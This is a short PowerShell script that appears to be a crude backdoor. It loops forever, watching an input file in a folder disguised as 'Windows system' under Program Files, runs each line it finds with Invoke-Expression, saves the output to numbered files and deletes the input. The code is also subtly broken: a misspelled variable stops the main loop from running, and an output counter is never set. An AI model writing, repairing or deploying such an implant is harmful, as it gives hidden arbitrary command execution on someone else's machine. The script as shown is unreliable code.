$counterInput = 0;
$lineCounter = 0;

while (1) {
    $path = -join('C:\Program Files\Windows system\input.txt');
    

    if(Test-Path $path){

        $input = Get-Content $path | select-object -skip $lineCounter;
        $lineCounter += $input.length;
        Foreach($line in $inupt){
            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');
            $output = Invoke-Expression $line;
            $joinedOutput = '';
            Foreach($s in $output){
                $joinedOutput+= $s;
                $joinedOutput+=[environment]::NewLine;
            }
            Set-Content -Path $outputPath -Value $joinedOutput;

            $counterInput+=1;
            Remove-Item $path;
        }
        <#if($input.length -ge 1){
            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');

            $output = Invoke-Expression $input;
            $joinedOutput = '';
            Foreach($s in $output){
                $joinedOutput+= $s;
                $joinedOutput+=[environment]::NewLine;
            };
            Set-Content -Path $outputPath -Value $joinedOutput;
        };
        
        $counterInput+=1;
        $counterOutput+=1;
        Remove-Item $path;#>
    };
    
    
    start-sleep -Milliseconds 120;
};